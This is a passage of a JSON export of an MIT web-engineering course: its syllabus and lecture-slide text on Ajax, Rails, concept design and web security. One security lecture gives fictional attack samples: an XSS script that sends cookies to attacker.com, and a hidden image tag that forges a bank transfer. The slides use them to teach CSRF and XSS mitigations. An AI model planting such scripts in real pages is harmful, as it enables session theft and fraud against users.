{
  "course_name": "Software Studio",
  "course_description": "This course on software engineering covers design and implementation of medium-scale software systems, using web applications as a platform. In the course, students learn the fundamentals of structuring a web application and writing modular code, with an emphasis on conceptual design to achieve clarity, simplicity, and modularity. Topics also include functional programming, relational databases, and security.",
  "topics": [
    "Engineering",
    "Computer Science",
    "Algorithms and Data Structures",
    "Programming Languages",
    "Software Design and Engineering",
    "Engineering",
    "Computer Science",
    "Algorithms and Data Structures",
    "Programming Languages",
    "Software Design and Engineering"
  ],
  "syllabus_content": "Course Meeting Times\n\nLectures: 2 sessions / week, 1.5 hours / session\n\nRecitations: 1 session / week, 1 hour / session\n\nCourse Description\n\nThis is a course in software engineering, with an emphasis on design. It focuses on building web applications and services because of their obvious relevance to students in building practical skills, and because there are so many readily available examples to study.\n\nIn addition to teaching the fundamental notions of structuring a web application, and how to write modular and elegant code, the course emphasizes behavioral and conceptual design: that is, designing the external behavior of the software rather than its internal structure. We believe that this aspect of design is the most important in practice, the least well-understood by MIT students, and the one that is hardest to acquire in standard industrial settings.\n\nCourse Objectives\n\nBy the end of this course, you should expect to:\n\nHave improved your ability to analyze problems, explore and invent designs, present your work, and critique the work of others\n\nHave developed a strong grasp of key software design notions (in particular, conceptual modeling, decoupling and abstraction) and improved skills in designing key components of a software system\n\nBe able to build medium-scale web applications using standard technologies, conducting all phases of development from problem analysis to deployment\n\nHave experienced the benefits and challenges of working in a team\n\nCourse Structure\n\nProjects\n\nYou will complete one introductory project, three solo projects, and one team project. Each project will be conducted in phases through which you will build an application incrementally. Key concepts that are needed to complete the project will be taught in class; the technologies you need will be taught through tutorials in recitation. All project work will be committed to GitHub. In the final phase of each project, you will write a brief critique of your own work, and in addition, a fellow student's work.\n\nReadings\n\nFor most class sessions, you will be asked to read one or more short articles in advance. The class will begin with a tiny \"nanoquiz\" comprising a few multiple choice questions about the readings.\n\nCollaboration and Grading\n\nACTIVITIES\n\nPERCENTAGES\n\nSolo Projects\n\n40%\n\nFinal Project\n\n30%\n\nNanoquizzes + Participation\n\n10%\n\nCoding + Design Work\n\n20%\n\nThe measure of the acquired skills in coding and design work will be computed by selecting the best grades received for the design and code portions of the solo projects (Projects 1, 2, and 3).\n\nSlack Days\n\nEach student has 3 slack days for the solo projects that allow work to be submitted late without penalty. You may use the total of 3 days across the 3 projects in any way you wish. If you plan to use a slack day, you must insert a file with the name SLACK_DAY.txt in the top level directory of your repository that contains a note indicating how many days you are taking on that project. This must be done before the due date but may be updated (adding additional days) as necessary. Delays due to medical reasons should be declared as slack days in the same way, and will not count against your slack day credit if a doctor's note is provided. No other extensions will be given except under very unusual circumstances.\n\nCollaboration\n\nThe solo projects are to be done individually though you may discuss your approach with fellow students, so long as (a) all written material is entirely your own, and (b) you explicitly acknowledge in your written materials who you talked to.\n\nReuse\n\nYou are free to use any third-party code, whether as libraries or code fragments, and to adopt any ideas you find online or in books, so long as it is publicly available and appropriately cited (see the\nsection on code\nin the\nMIT Academic Integrity Handbook\nfor details). You may not use work produced by students in earlier offerings of this class. If you violate this policy, you can expect to be asked to drop the class (or worse). The team projects, of course, are intended to be fully collaborative.\n\nClass Contract\n\nThe teaching staff of the course will endeavor to:\n\nDeliver content that is stimulating, practically useful and of long term intellectual value\n\nEncourage interaction during all class and recitation sections, and take all questions seriously\n\nProvide constructive and helpful feedback on student work in a timely fashion\n\nAssign grades in a fair and consistent way\n\nTake seriously suggestions about course content and structure\n\nHelp students who feel overwhelmed or lacking in background, despite prerequisites\n\nSupport and encourage full participation of all students\n\nAs a student, by taking this course, you agree to endeavor to:\n\nAttend all class sessions and participate enthusiastically\n\nNot use laptops and mobile devices during class for email and other distracting activities\n\nShare concerns and comments about the course with the lecturer\n\nHelp create a sense of community by making forum postings anonymous only when absolutely necessary\n\nDo your fair share of work on your team project",
  "files": [
    {
      "category": "Resource",
      "title": "Ajax: Engage App",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/cf2a80ea30ab612907a23a981d5e7f27_MIT6_170S13_49-asyn-app.pdf",
      "content": "software\nstudio\nasynchronous calls:\nEngage app\nEunsuk Kang\n\nchallenge\n› multiple viewers\n› update view when document changes?\n\ndesign alternatives\nusers manual refresh\n› easy, but undesirable\npolling\n› client sends a request periodically\n› simple to implement\n› scalability issues (wasted requests)\nserver-side push\n› server sends out updates to clients\n› efficient, scalable\n› no built-in support in Rails\n› Juggernaut, Comet, WebSocket, etc.\n\npolling\n# Return the latest version of the document for this project\n# GET /latest_doc\ndef latest_doc\nproject = Project.find(params[:id])\nserver side\ndoc = project.extract_latest_doc\nrender :json => doc\nend\nexercise: can you come up with the client code to perform polling?\n› assume JS function update_document(doc)\n› also available: $.get, $.ajax, setInterval\n\npolling\n# Return the latest version of the document for this project\ndef latest_doc\nproject = Project.find(params[:id])\ndoc = project.extract_latest_doc\nserver side\nrender :json => doc\nend\nvar POLL_INTERVAL = 5000;\nvar poll = function () {\n$.ajax({ url : '/projects/<%= @project.id %>/latest_doc',\nsuccess : function(response) {\nupdate_document(response);\nclient side\n},\ntype : 'GET', dataType : 'json'});\n};\nvar start_polling = function () {\nsetInterval(poll, POLL_INTERVAL);\n};\n› model instance automatically converted into json\n\ncustom JSON in Rails\n# Return the latest version of the doc and\n#\nthe set of users who are currently online\ndef status\nproject = Project.find(params[:id])\nserver side\njson_response = { :document => project.extract_latest_doc,\n:users => project.online_users }\nrender :json => json_response\nend\nvar poll = function () {\n$.ajax({ url : '/projects/<%= @project.id %>/status',\nsuccess : function(response) {\nupdate_document(response.document);\nclient side\nupdate_online_users(response.users);\n},\ntype : 'GET', dataType : 'json'});\n};\n\nAJAX summary\nin Javascript\n› timers\n› jquery methods\nin Rails\n› constructing JSON\n› form helpers\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Exam",
      "title": "Ajax: Examples",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/23728628acd5486841f72e85b02ef24c_MIT6_170S13_48-asyn-exam.pdf",
      "content": "software\nstudio\nasynchronous calls:\nexamples\nDaniel Jackson\n\ntimers\nvar alert_timers = function () {\nsetTimeout(function () {alert(\"page about to expire!\");}, 2000);\nsetInterval(function () {alert(\"take a typing break!\");}, 4000);\n};\n› asynchronous event due to timeouts\n› note that alert is modal (and synchronous)\n\nloading HTML\nvar loading = function () {\nvar url = 'http://localhost:3000/status';\n$('#status').html('<img src=\"animated.gif\"/>').load(url);\n};\n# GET /status\ndef status\nsleep 2\nserver side\nrender :text => \"status : UP\"\nend\n› method chaining idiom: element.html().load()\n› animated GIF is replaced when callback executes\n› sleep 2 simulates network delay\nclient side\n\ncontinual refresh\nvar continual = function () {\nvar url = \"http://localhost:3000/status\";\nsetInterval(\nfunction () {\n$('#status').html('<img src=\"animated.gif\"/>').load(url);\n}, 5000);\n};\nclient side\n# GET /status\ndef status\nsleep 2\nserver side\nrender :text => \"status : UP\"\nend\n› every 5s, gets status and displays it\n\ngetting a string, passing to callback\nvar simple_get = function () {\nvar url = 'http://localhost:3000/debug';\n$.get(url, function (d) {alert(\"Server says: \" + d);});\n};\nclient side\n# GET /debug\ndef debug\nrender :text => \"Sorry! This app has failed catastrophically!\"\nend\nserver side\n› server returns string\n› callback simply calls alert\n\nsending an object\nvar get_with_send = function () {\nvar url = 'http://localhost:3000/welcome';\nvar data = {user: \"Daniel\"};\n$.get(url, data, function (d) {alert(d);});\n};\nclient side\n# GET /welcome\ndef welcome\nuser = params[:user]\nserver side\nrender :text => \"Welcome, \" + user\nend\n› client passes Javascript object\n› because call is $.get, appended as query string on url\n› server returns string\n\ngetting a JSON object\nvar get_json_status = function () {\nvar url = 'http://localhost:3000/status.json';\n$.ajax({ url : url,\nsuccess : function (result) {\n$('#status').html('status: ' + result.status +\n' at: ' + result.time);\n},\ntype : 'GET', dataType : 'json'\n});\nclient side\n};\n# GET /status\ndef status\nsleep 2\nrespond_to do |format|\nformat.html { render :text => \"status: UP\" }\nformat.json { render :json => {:status => \"UP\", :time => \"2pm\"} }\nend\nend\nserver side\n› $.ajax: most basic AJAX method in jquery\n› server returns JSON encoded object\n› JQuery's .ajax decodes, passes JS object to callback\n\nAJAX in Rails form\n<p>Please type your name.</p>\n<%= form_tag(\"/register\", :method => \"get\", :remote => true) do %>\n<%= label_tag(:name, \"Your name:\") %>\nindex.html.erb\n<%= text_field_tag(:name) %>\n<%= submit_tag(\"Submit\") %>\n<% end %>\ndef register\n@name = params[:name]\nrespond_to do |format|\nformat.js\ncontroller\nformat.html { render :text => 'Not an AJAX call, ' + @name }\nend\nend\nalert('Now I know your name, <%= @name %>.');\nregister.js.erb\n› :remote => true for Ajax requests\n› also useful: link_to_remote method\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Ajax: Introduction",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/2e772463eebb035f1b5d38accee189ed_MIT6_170S13_47-asyn-intro.pdf",
      "content": "software\nstudio\nasynchronous calls\nDaniel Jackson\n\nsome history\nin the 1990s\n› most web sites issued a whole page at a time\n› clunky for users, excessive bandwidth\nidea\n› update page incrementally\n› do it asynchronously, so browser doesn't freeze\nin 1999, XMLHttpRequest arrives\n› Microsoft invents XHR idea for ActiveX in IE5\n› adopted by other browsers for Javascript\nin 2005, called \"Ajax\"\n› asynchronous JavaScript and XML\n\nwhat you can do with Ajax\npush updates to page\n› status, stock quotes, weather, time\ninteract with user over input\n› drill downs (eg, state>city), autocomplete\npersist user data on server\n› Google docs, stickies\nexecute server-side commands on same page\n› vote up/down on posts, email portal\n\nevent model\nrun\nevent\nevent queue\ntimer list\n› single thread\n› event loop: run timed event if expired or event at front of Q\n› events added by: user actions, server responses, events\n\nparticulars\ntwo key facts\n› each event runs to completion before next event\n› response to Ajax request is not always next\ngood news\n› no need to worry about mutual exclusion\nbad news\n› long-running event freezes the UI\n› timeouts may run late\n› when Ajax response comes, context may have changed\n\nJQuery's Ajax API\n$.getScript(url, callback)\n› get script at url, run it, then execute callback\ne.load(url)\n› get content at url, and insert into element e\n$.getJSON(url, data, callback)\n› pass data to server at url\n› server sends JSON back; parse and pass to callback\n$.get(url, data, callback, type)\n› type determines preprocessing of response\n› $.post similar, but does HTTP post instead\n$.ajax(...)\n› most flexible, lowest level method\n\nusing network inspector\n› example from Safari\n\nusing network inspector\n› can see here that request was get\n\n<person>\n<firstName>John</firstName>\nencoding data for transit\n<lastName>Smith</lastName>\n<age>25</age>\n<address>\n<streetAddress>21 2nd\nStreet</streetAddress>\nXML\n<city>New York</city>\n<state>NY</state>\n<postalCode>10021</\n› parsing built into browser (XHR)\npostalCode>\n</address>\n› comes back as DOM: not convenient\n<phoneNumber type=\"home\">212\n555-1234</phoneNumber>\n<phoneNumber type=\"fax\">646\nJSON\n555-4567</phoneNumber>\n</person>\n› Javascript object literals\n\"firstName\": \"John\",\n› JQuery uses parser, not eval (why?)\n{\n\"lastName\" : \"Smith\",\n\"age\"\n: 25,\n\"address\" :\n{\n\"streetAddress\": \"21 2nd Street\",\n\"city\"\n: \"New York\",\n\"state\"\n: \"NY\",\n\"postalCode\"\n: \"10021\"\n},\n\"phoneNumber\":\n[\n{\n\"type\" : \"home\",\n\"number\": \"212 555-1234\"\n},\n{\n\"type\" : \"fax\",\n\"number\": \"646 555-4567\"\nexamples from http://en.wikipedia.org/wiki/JSON\n}\n]\n}\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "An Overview of Rails",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/41673afb1ac2f91f3724fd7d28c5da14_MIT6_170S13_10-rails-ovrvw.pdf",
      "content": "software\nstudio\nan overview of Rails\nDaniel Jackson\n\nwhat is Rails?\nan application framework\n› full stack: web server, actions, database\na programming environment\n› eg, rake (like make), unit testing\nan open-source community\n› many plugins\n\nhistory of Rails\ngenesis in Basecamp\n› project management tool by 37signals\nrelease\n› open source in 2004\n› shipped with OS X 10.5 in 2007\n› Rails 3.1 in 2011, merging with Merb\nRails's creator, describing\nhimself with the typical\nScreenshot of David Heinemeier's bio removed due to copyright restrictions.\nSee his website for the image.\nmodesty of the nouveau\nriche\n\nconvention over configuration\nthe key idea behind Rails\n› database table: users\n› model class: User\n› file: /app/models/user.rb\nwhat's the alternative?\n› configuration files\n\ntechnical features\nRails supports\n› JQuery as standard JS library\n› Sass for CSS templating\n› ERB or HAML for HTML templating\n› MySQL or PostgreSQL database\nsupport for Rails from\n› web servers such as Apache\n› hosting services such as Heroku\n\nmodel-driven development\nRails generates these...\nif you type this...\n\nRails snags: reliance on strings\nconventions rely on strings used for names\n› pluralization: cute but ultimately painful\n› name munging, eg for path helpers\nalpha equivalence fails in Rails\n› in lambda calculus, λx.x = λy.y\n› \"rename variable\" refactoring\nif you code this route:\nyou get these functions:\n\nOriginal question asked by Donald Hughes on Stack Overflow.\n\nOriginal question asked by Sasha on Stack Overflow.\n\nOriginal question asked by salt.racer on Stack Overflow.\n\nRails snags: too much magic\nimplicit calls\n› bad for non-experts\n› bad for tools\nmissing specs\n› not clear what's going on\n› magic changes over time\nan example\n› which fields in forms are logged?\n› next slide...\n\nPull request by jeyb on GitHub.\n\nin summary...\nrich environment\nmany libraries\ncode generation\nhelpful community\nfriendly online guides\ninvisible magic\nquirky conventions\nno static checking\nmasking of failures\n?\n\nan easy life?\nor a\ndeadly\ncocktail?\n\nactually, neither\nevery tool has benefits & limitations\n› just need to recognize them\n› & work around the limitations\nalso, realize that context matters\nRails is great for\n› rapid development\n› data intensive apps with rich UIs\nnot so suitable for\n› critical systems (eg, banking)\n› specialized data (eg, web searching)\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Analyzing Origins",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/a2acea2dbfdf2cce822ab7253509eaa0_MIT6_170S13_58-anal-ogn.pdf",
      "content": "software\nstudio\nanalyzing origins\nDaniel Jackson\n\nadding origins to our model\nHTTPEvent\nfrom, to, origin\n!\nEndPoint\ncauses\n!\nRequest\nResponse\nresponse\n!\nEmbedded\nRequest\nRedirect\nResponse\n!\nembeds\n!\nClient\nServer\n\nanalysis steps\n› define origin tracking & policy\n› express security property\n› check that policy implies property\n\ndefine origin tracking\nabstract sig EndPoint { causes: set HTTPEvent }\nsig Client, Server extends EndPoint {}\nabstract sig HTTPEvent { from, to: EndPoint}\nsig Request extends HTTPEvent { response: Response }\nsig Response extends HTTPEvent { embeds: set Request }\nsig Embedded extends Request {}\nsig Redirect extends Response { }\nfact Origin {\n\n// for a redirect, origin is same as request; else server\n\nall r: Request | r.response.origin =\n\n(r.response in Redirect implies r.origin else r.response.from)\n\n// embedded requests have the same origin as the response\n\nall r: Response, e: r.embeds | e.origin = r.origin\n\n// requests that are not embedded come from the client\n\nall r: Request - Embedded | r.origin = r.from\n\n}\n\ndefine policy\npred appliesSOP (s: Server) {\n\n// request is only accepted if origin is server itself or sender\n\nall r: Request | r.to = s implies r.origin = r.to or r.origin = r.from\n\n}\n\nexpress policy\ncheck {\n\nno server: Server, attacker: Server - server {\n\n// no direct request to attacker\n\nno r: Request | r.to = attacker and r.origin in Client\n\n// trusted server obeys origin policy\n\nserver.appliesSOP\n\n// and attacker still gets request through\n\nsome r: attacker.causes | r.to = server\n\n}\n\n} for 6 but 1 Client, 2 Server\n\nattack!\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Cross Site Request Forgery, Revisited",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/5442e3fc42355088ec9b137f8afaf699_MIT6_170S13_56-sec-rev.pdf",
      "content": "software\nstudio\nCSRF,\nrevisited\nDaniel Jackson\n\ncross site scripting (XSS)\nA Fictional Example\non Facebook, attacker posts this on wall:\n<script>\nwindow.location = 'http://attacker.com/steal?cookie = ' + document.cookie\n</script>\nnow, when other user displays Facebook page...\n› script sends her cookies to attacker\n› could get server-side private data too!\nthis is \"persistent XSS\"\n› simpler form: pass URL with query that puts script in page\n\ncross site request forgery (CSRF)\nA Fictional Example\non attacker's site, include hidden call to bank:\n<img src=\"http://mybank.com/transferFunds?\namount=1000&destination=attackersAcct\" width=\"0\" height=\"0\" />\nnow, when other user loads attacker's page...\n› hidden call transfers her money to the attacker\n› can use all her credentials (session, cookies)\ncombine with XSS\n› attacker can place call on a trusted site\n\ninfamous CSRF attacks\nGmail\n› get contact list (Jan 2007)\n› add mail filters (Sept 2007)\nNetflix\n› change name & delivery address (2007)\n› modify movie queue (2009)\nhttp://ajaxian.com/archives/gmail-csrf-security-flaw\nhttp://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/\nhttp://appsecnotes.blogspot.com/2009/01/netflix-csrf-revisited.html\n\nwhat's going on?\nactual\nserver\nclient\nevil.org\n+CSS\nintended\nbank.com\nserver\nintended\nclient\n+CSRF\nactual\nclient\nevil.org\nbank.com\nXSS and CSRF are duals\n› XSS: client confuses servers\n› CSRF: server confuses clients\nso it's about authentication\n› XSS: of server\n› CSRF: of client\nclient\n\nstandard CSRF mitigations\nchallenge/response\ndon't stay logged in!\n› CAPTCHA, password reentry\n› inconvenient for client\nsecret session token\n› add it to all URLs (but token is leaked)\n› put in hidden form field (then only POSTs)\n› \"double submit\": token in cookie and form\n<form action=\"/transfer.do\" method=\"post\">\n<input type=\"hidden\" name=\"CSRFToken\" value=\"OWY4NmQwODQ2\">\n...\n</form>\nform generated with tokens, as by Rails's protect_from_forgery\n\nlogin CSRF\nbut what about login?\n› no session yet, so no token!\nscenario\n› attacker logs you out of Google\n› and back in using attacker's credentials\n› now attacker gets your search history!\n\nmitigating login CSRF\nreferrer field\n› request includes referrer URL (in referer header)\n› if request has referrer attacker.com, mybank.com rejects it\nbut sadly\n› referrer doesn't work (privacy, protocol holes)\nrequest obtained by clicking on link in a vanity search\n\nsame origin policy\nwhat is it?\n› origin = (domain, protocol, port)\n› suppose load page from P, make request to Q\n› request is blocked if origins of P and Q do not match\nJSONP: a workaround for mashups etc\n› SOP allows GET of scripts from other domains (eg, JQuery CDN)\n› to read cross-domain data, get a script of form callback(data)\n› the callback is called \"padding\"\nso what does SOP achieve?\n› stops reading of personal data by a rogue site\n› but doesn't prevent POST, hence can't stop CSRF\n› also, API-specific (JavaScript, Flash, Acrobat), so loopholes\n\norigin header proposal\nidea: add a new origin header\n› browser tracks origin of request, server checks it\naddress privacy issues of referrer\n› only scheme, host, port: no query strings or full path\n› missing header (old browser) = null value (hidden)\ncross-origin request sharing (CORS)\n› browser will also block cross-origin requests, using SOP\n› CORS lets server tell browser that some origins are OK\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Design Concepts: Design Moves",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/fba964ce0817bed1cb666febfce5f26f_MIT6_170S13_28-con-design.pdf",
      "content": "software\nstudio\nconcept design moves\nDaniel Jackson\n\nthe concept design loop\nconcept design\nsimplify/generalize\ninvent/rethink\ndeploy/evaluate\n\nsimplify/generalize\nstrategy\n› note rough edges and complications\n› make concepts simpler & more general\nold: deletion in Unix mail\n› undelete by message number\n› all deletions final after quitting\nnew: deletion in modern mail clients\n› deleted messages is a folder\n› same strategy with spam, sent, etc\n\ninvent/rethink\nstrategy\n› concept seems good, but doesn't work\n› rethink from scratch\nold: \"align & distribute\"\n› middle vs center?\n› distribute not enough: can't stretch\nnew: snap align\n› originally in Aldus Intellidraw?\n› flash all alignment lines, and snap\nnew concept\n› not necessarily simpler!\nIntellidraw's snap align\nas implemented in OmniGraffle\n\ninvent/rethink\nold: tone edit in Photoshop\n› add adjustment layer + adjust\n› for local edit, use brush on mask\n› concepts: layer, mask, brush\nnew: tone edit in Lightroom\n› drag tone slider\n› for local edit, use brush\n› concepts: setting, brush, action\n\nmy favorite software quote\nI gave desperate warnings against the obscurity, the\ncomplexity, and over-ambition of the new design,\nbut my warnings went unheeded. I conclude that\nthere are two ways of constructing a software\ndesign: One way is to make it so simple there are\nobviously no deficiencies and the other way is to\nmake it so complicated that there are no obvious\ndeficiencies.\nTony Hoare, Turing Award Lecture, 1980\n(c) Tony Houre. All rights reserved. This content is excluded from our Creative\nCommons license. For more information, see http://ocw.mit.edu/fairuse.\n\na relentless pursuit of simplicity\nsimplification\nsimplification\nsimplification\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Design Concepts: Identifying Concepts",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/baa905f1c077ffb1c8c2f2e03e4a5100_MIT6_170S13_27-con-idntfyg.pdf",
      "content": "software\nstudio\nidentifying concepts\nDaniel Jackson\n\nbefore\nwe invent concepts,\nwe have to learn\nto recognize them...\n\nnot what it's about...\nKeynote is about presentations,\nanimations, images and text\nExcel is about spreadsheets,\ncharts, calculations, data\nChrome is about websites,\nnews, chat, shopping\nScreenshots of Keynote, Excel, and Chrome removed due to copyright restrictions.\n\ninstead: core concepts\nwhat are the concepts?\n› that make it work?\n› that you need to grasp as a user?\n› that characterize this class of systems?\n› that distinguish it from other systems?\nconcepts\n=\nsolution to a\ndesign problem\n\ngame 1: identify the design problem\nfor each concept, can you identify the problem it solves?\nemail client\n› alias\nword processor\n› paragraph\n› style sheet\nspreadsheet\n› formula\n› relative address\nsocial network\n› tag\n› friend\n› status\n\ngame 2: identify the concepts...\ncreating\nGoogle Forms\nresponding\nanalyzing\n(c) Google. All rights reserved. This content is excluded from our Creative Commons license.\nFor more information, see http://ocw.mit.edu/fairuse.\n\nkinds of concept\ndomain\nconcept exists in problem\ndomain\nphoto, movie, song\ndirect flight, code share\n401k, CDO, commission\ntypeface, ligature\nanalogic\nconcept is analogy to\nfamiliar notion\nblog post, email, tweet\ndesktop, folder, file\nlayer, mask, stacking\ncart, order, item\nsynthetic\nconcept is invented\nanimation\nhypertext link\ntag, keyword\nselect, cut buffer\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Design Concepts: Idioms",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/e27f5e7ca6cd3bf503ade9041fbcf2fa_MIT6_170S13_29-con-idioms.pdf",
      "content": "software\nstudio\nconcept idioms\nDaniel Jackson\n\nwhat are idioms?\nidioms\n› well-established concepts\n› used in many apps and contexts\nreuse by designers\n› usually polished and well understood\n› risks and limitations known\nfamiliar to users\n› helps ease of use\n\"near misses\"\n› beware of almost using an idiom\n\nformat\nproblem\n› a design problem to be solved\nsolution\n› one or more concepts\nexamples\n› in well known apps\nrefinements\n› more elaborate forms often used\nobject model\n› concepts & relationships\n\nidiom: multi-selection\nproblem\n› how to apply actions to sets of items\nsolution\n› selection: a subset of items chosen\n› action: applied to all objects in selection\nexamples\n› characters in word processors\n› graphical objects in drawing apps\n› photos in cataloging apps\nrefinements\n› group/ungroup: form new composite object\n› active item: one element in selection plays special role\n› invert (and other set-theoretic operations)\n› partial selection (eg, of pixels in Photoshop)\nAction\ntargets\nItem\nSelected\nActive\n\ncase study: Lightroom selection\nactive element is highlighted\nmaintains selection when different folder selected\nif selected images appear in that folder\n(c) Adobe Systems. All rights reserved. This content is excluded from our Creative\nCommons license. For more information, see http://ocw.mit.edu/fairuse.\n\nidiom: cut-buffer\nproblem\n› how to move items between contexts\nsolution\nitems\nItem\nBuffer\n+\nNonEmpty\nBuffer\nContext\nitems\n?\n› buffer: stores item to be transferred\nexamples\n› text editor cut-and-paste\n› moving files in Windows\nrefinements\n› set: buffer can contain multiple items\n› object embedding: item is shared, not copied\n› multiple buffers\n\ncase study: evernote web clipper\ncopies to server\nhave to sync to see in local app\n(c) Evernote. All rights reserved. This content is excluded from our Creative\nCommons license. For more information, see http://ocw.mit.edu/fairuse.\n\nStyle\nRule\nProperty\nValue\nrules\n!\n!\nElement\nDocument\nStylesheet\nelements\nstyles\nstyle\nstylesheet\n!\n!\nidiom: stylesheet\nproblem\n› maintain consistent styling\nproperty\n› make global changes easy\nsolution\nvalue\n› style: holds formatting rules, attached to objects\nexamples\n› paragraph and character styles in Word, Indesign, Pages\n› themes in Powerpoint\n› cascading style sheets for HTML\nrefinements\n› stylesheets: reuse and separation of sets of styles\n› selectors: match objects implicitly\n› inheritance: of properties from style to style\n› overlapping styles: eg, character and paragraph styles\n\ncase study: color palettes\nPowerpoint themes\nOS X palette\nnot real styles\nIndesign swatches\n(c) Apple, Microsoft, and Adobe Systems. All rights reserved. This content is excluded from our\nCreative Commons license. For more information, see http://ocw.mit.edu/fairuse.\n\npalette object models\nthree subtly different approaches\n› what happens when palette is modified?\npalette\npalette\npalette\nDoc\nElement\nelements\nPalette\nSwatch\nswatches\ncolour\nkey\nvalue\nkey\nvalue\ncolour\nDoc\nElement\nelements\nPalette\nswatches\nSwatch\nDoc\nElement\nelements\nPalette\nSwatch\nswatches\nColour\nvalue\ncolour\nName\nkey\nName\nColour\nName\nColour\n\"Every problem in computer science can be solved by introducing another level of indirection\"\n-- David Wheeler\n\nFile\nObject\nDirectory\nName\nname\ndir\nRoot\nidiom: directory\nproblem\n› organize many items into navigable space\nsolution\n› tree of directories, each its own namespace\nexamples\n› mailboxes in email clients\n› folders in OS X, directories in Unix\n› domains in DNS\n› package structuring in Java\nrefinements\n› links: allows arbitrary cross-connections\n› encapsulation (eg, OS X packages)\n\ncase study: IMAP mailboxes\nsome issues\n› many email clients allow '/' in mailbox names: trouble\n› in some servers, mailboxes cannot contain messages & mailboxes\n\nName\n?\n!\nFile\nBuffer\nfile\n?\nname\nidiom: save-as\nproblem\nname\n› allow updating of multiple files on disk\nsolution\n› buffer, with explicit commands to load from and write to disk\nexamples\n› almost all desktop applications\nrefinements\n› export: separate out saving different types, especially if lossy\n› propagation of renaming (from file to buffer)\n› versions: track all previous versions\n\ncase study: OS X Lion rethinking\nchanges\n› save as replaced by dup\n› rename, move to adde\n› revert to any version\nwhy did they do this?\nlicate\nd\n(c) Apple. All rights reserved. This content is excluded from our Creative\nCommons license. For more information, see http://ocw.mit.edu/fairuse.\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\n\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Design Concepts: Intro",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/7673900e3f0c778ef27f274ccb541a6a_MIT6_170S13_26-con-intro.pdf",
      "content": "software\nstudio\nconceptual design: why?\nDaniel Jackson\n\nratings\n(c) Amplicate. All rights reserved. This content is excluded from our Creative\nCommons license. For more information, see http://ocw.mit.edu/fairuse.\nfrom http://amplicate.com\n\nadobe acrobat pro\n\ncropping in photoshop\n\nadobe lightroom\n\ncharm & style\nScreenshot from MailChimp removed due to copyright restrictions.\n\nskin deep?\nScreenshot of Microsoft Word's \"Clippy\"\nremoved due to copyright restrictions.\nClippy\n2003-2008\nRIP\n\nLightroom architecture diagram removed due to copyright restrictions.\n\nSee Troy Gaul's presentation for reference image.\ncode\nuser's model\ninterface\nconceptual model\n\nputting it another way...\n\"make your\nabstractions\nrobust\"\nbut which\nabstractions?\n\nweak concepts\nstrong concepts\nhard to use\nintuitive, predictable\na mess to maintain\ndecoupling & localization\nunreliable & buggy\nmore dependable\n\nstandard (good) practice\nthinking & sketching\nsimulating features\nnormal design practice\ncopying good ideas\nevaluating products\nuser feedback\ndiscarding failed designs\n\"refactoring\"\nPhoto of Steve Jobs, speaker of the quotation,\nremoved due to copyright restrictions.\n\nnon-standard (better) practice\nbeing explicit\nfocusing: what are the concepts?\nrelating: how are they related to each other?\nanalyzing: what properties do they have?\n\nMIT OpenCourseWare\nhttp://ocw.mit.edu\n6.170 Software Studio\nSpring 2013\nFor information about citing these materials or our Terms of Use, visit: http://ocw.mit.edu/terms."
    },
    {
      "category": "Resource",
      "title": "Final Project Schedule",
      "type": "PDF",
      "source_url": "https://ocw.mit.edu/courses/6-170-software-studio-spring-2013/5da8303a4c8e3f14549d3a5be0dbf752_MIT6_170S13_fin-Proj-Cal.pdf",
